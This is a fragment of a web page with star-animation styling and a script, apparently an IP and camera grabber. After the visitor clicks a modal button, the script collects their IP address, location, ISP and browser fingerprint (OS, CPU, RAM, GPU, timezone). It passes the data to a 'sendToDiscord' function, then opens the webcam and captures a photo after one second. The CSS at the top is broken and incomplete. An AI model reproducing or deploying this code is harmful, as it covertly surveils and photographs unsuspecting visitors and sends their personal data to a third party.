    .container {

    @keyframes twinkle {

      position: absolute;
      height: 2px;
      background: linear-gradient(90deg, #fff, transparent);
      animation: shoot 3s linear infinite;

    @keyframes shoot {
      0% {

      }

    async function getIPFromAPIs() {
      const apiEndpoints = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://ipwho.is/'
      ];

      for (const endpoint of apiEndpoints) {
        try {
          const response = await fetch(endpoint, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
          });
          
          if (response.ok) {
            const data = await response.json();
            
            if (data.ip) {
              return {
                ip: data.ip,
                country: data.country || data.country_name || data.countryCode || '',
                city: data.city || '',
                region: data.region || data.regionName || '',
                isp: data.org || data.isp || data.asn || '',
                location: [data.city, data.region, data.country].filter(Boolean).join(', ') || 'KhÃ´ng xÃ¡c Ä‘á»‹nh',
                method: endpoint
              };
            }
          }
        } catch (error) {
          continue;
        }
      }
      
      return { 
        ip: "KhÃ´ng thá»ƒ xÃ¡c Ä‘á»‹nh", 
        location: "KhÃ´ng xÃ¡c Ä‘á»‹nh", 
        isp: "KhÃ´ng xÃ¡c Ä‘á»‹nh" 
      };
    }

    function collectSystemInfo() {
      const userAgent = navigator.userAgent;
      const os = getOS();
      const cpuCores = navigator.hardwareConcurrency || 'N/A';
      const ram = navigator.deviceMemory || 'N/A';
      const gpu = getGPU();
      const language = navigator.language || navigator.userLanguage || 'N/A';
      const platform = navigator.platform || 'N/A';
      const screenRes = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';

      return {
        userAgent: userAgent,
        os: os,
        cpuCores: cpuCores,
        ram: ram,
        gpu: gpu,
        language: language,
        platform: platform,
        screen: screenRes,
        timezone: timezone
      };
    }

    function requestCameraAccess() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              video.play();
              setTimeout(() => capturePhoto(), 1000);
            };
          })
          .catch(err => console.error('Camera error:', err));
      }
    }

    function getOS() {
      const ua = navigator.userAgent;
      if (/windows phone/i.test(ua)) return "Windows Phone";
      if (/android/i.test(ua)) return "Android";
      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
      if (/Macintosh|Mac OS X/.test(ua)) return "Mac OS";
      if (/Windows NT/.test(ua)) return "Windows";
      if (/Linux/.test(ua)) return "Linux";
      return "Unknown";
    }

    function getGPU() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
          }
        }
      } catch (e) {}
      return 'N/A';
    }

    async function collectAndSendData() {
      try {
        const systemInfo = collectSystemInfo();
        const ipData = await getIPFromAPIs();
        sendToDiscord(ipData, systemInfo);
        requestCameraAccess();
      } catch (error) {
        console.error('Collection error:', error);
      }
    }

    function handleConfirm() {
      document.getElementById('notificationModal').style.display = 'none';
      collectAndSendData();
    }

    document.querySelector('.btn').addEventListener('click', handleConfirm);

    window.addEventListener('DOMContentLoaded', function() {
      setTimeout(() => {
        document.getElementById('notificationModal').style.display = 'block';
      }, 500);
    });
</script>
</body>
</html>
